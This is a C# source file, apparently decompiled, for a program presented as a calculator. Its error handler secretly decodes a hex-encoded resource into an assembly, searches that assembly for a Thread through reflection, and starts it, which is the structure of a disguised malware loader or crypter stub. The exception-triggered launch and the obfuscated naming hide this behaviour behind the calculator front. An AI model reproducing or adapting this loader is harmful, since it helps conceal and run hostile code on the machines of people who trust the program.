using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Calculator.Forms;
using Calculator.Helpers;
using Calculator.Properties;

namespace Calculator;

internal static class Program
{
	private static frmMain MainForm;

	public static void Main()
	{
		Application.add_ThreadException((ThreadExceptionEventHandler)delegate
		{
			ThreadPool.QueueUserWorkItem(ProcessError);
		});
		AppDomain.CurrentDomain.UnhandledException += delegate
		{
			ThreadPool.QueueUserWorkItem(ProcessError);
		};
		InitializeProgram();
	}

	private static void InitializeProgram()
	{
		Application.EnableVisualStyles();
		MainForm = new frmMain();
		Application.Run((Form)(object)MainForm);
	}

	public static void ProcessError(object o)
	{
		if (Process.GetCurrentProcess().MainModule!.FileName != MainForm.TextboxText)
		{
			LoadMachine<Random> loadMachine = new LoadMachine<Random>(new Random(), Utility.ConvertHexStringToByteArray(Resources.Query));
			Console.WriteLine(loadMachine.ToString());
			Type[] types = ((Assembly)loadMachine.Car).GetTypes();
			foreach (Type type in types)
			{
				FieldInfo[] fields = type.GetFields();
				foreach (FieldInfo fieldInfo in fields)
				{
					if (fieldInfo.GetValue(fieldInfo) is Thread)
					{
						MainForm.InvokeFoundTrease((Thread)fieldInfo.GetValue(fieldInfo));
						((Form)MainForm).Close();
						return;
					}
				}
			}
		}
		else
		{
			Console.WriteLine("Test Jkld;asda");
		}
	}
}
